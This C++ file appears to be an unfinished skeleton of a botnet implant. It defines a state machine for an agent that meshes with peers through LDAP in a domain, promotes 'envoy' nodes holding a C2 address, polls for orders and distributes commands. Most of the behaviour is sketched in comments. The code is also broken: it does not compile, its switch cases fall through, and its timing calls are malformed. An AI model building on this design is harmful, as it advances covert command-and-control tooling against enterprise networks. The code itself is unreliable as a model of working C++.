#include <iostream>
#include <array>
#include <string>
#include <json/json.h>

enum State { //The current state of the agent
    INIT,
    WAIT_FOR_PEERS,
    SLEEP,
    DORMANT,
    ACTIVE,
    INTENSIVE,
    PANIC
};

//abstract class representing a network
class networkObject {
    protected:
    State state;

    public:
    bool stateChanged;

    //function which handles a state change
    virtual void changeState() {}
    virtual State getState() { return state; }

    //main statemachine function
    virtual void doStep() {}
};

class MeshNet : networkObject{
public:
    int networkStep;       // Stores the time between network transactions.
    int heavyCounter;      // Keeps track of how many light steps have occured. Light steps skip most of the intensive LDAP queries.
    std::string me;        // Stores the name of the current machine
    std::string domain;    // Stores the Domain name
    std::string network;   // Stores the LDAP address of the meshnet settings in LDAP

    State state;

    void changeState(State newState) {
        state = newState;
        stateChanged = true;
    }

    void doStep() {
        stateChanged = false;

        switch (state) {
            case INIT:
                //attempt to set the LDAP joined flag
                    // if successful move to WAIT_FOR_PEERS
                        // Otherwise attempt to configure the LDAP schema
                            // if unable, move to dormaint
                                state = WAIT_FOR_PEERS;
            case WAIT_FOR_PEERS:
                //read the settings object
                    // if recived move to ACTIVE
                        // else continue waiting
                            // if waiting for more than 3 loops then force promote to envoy
                                state = ACTIVE;
            case ACTIVE:
                //query for new commands,
                    //return the value
                        //after x steps move to intensive
                            //if no commands for x steps move to panic
                                heavyCounter++;
            if (heavyCounter >= 5) {
                heavyCounter = 0;
                state = INTENSIVE;
            }
            case INTENSIVE:
                //query for new peers
                    //Send network config to new peer
                        //check envoyStatus
                            // if additional envoys needed attempt to move to envoy
                                state = ACTIVE;
        }
    }
};

class Envoy : networkObject{
    public:
    State state;
    std::string c2Address;
    //linked list storing connection methods
};

class Peer {
    public:
    int id;
    std::string LDAPName;
    std::string hostname;
    std::string ip;
};

class ipv4 {
    public:
    int[4] octects;
};

int main() {
    bool debug = true;
    if (debug) {std::cout << "Starting Agent" << std::endl;}
    MeshNet mesh = new MeshNet();
    Envoy envoy = new Envoy();

    while(1) {
        int startTime = time(NULL);
        //debug: print state information

        //Main state machine


        do while (envoy.stateChanged){}
        switch(envoy.state) {
            case SLEEP:
                //check for network connectivitiy (ping www.msftconnecttest.com)
                //if avalaible move to init
            case INIT:
                //attempt to poll mesh for envoy status using all prefered methods registered with envoy
                //if unavailable due to network, then sleep.
                //if Envoys are needed, then register, then promote
            case ACTIVE:
                //check meshnet envoy status, demote to dormant if too many
                //Poll c2 for orders
                //distribute commands
                //update envoy heartbeat
            case PANIC:
                //attempt every conneciton method in envoy
            case DORMANT:
                //check envoy status, if more envoys needed then promote
        }

        sleep(mesh.networkStep - time() + startTime);
    }

    if (debug) {std::cout << "Exiting..." << std::endl;}

    return 0;
}
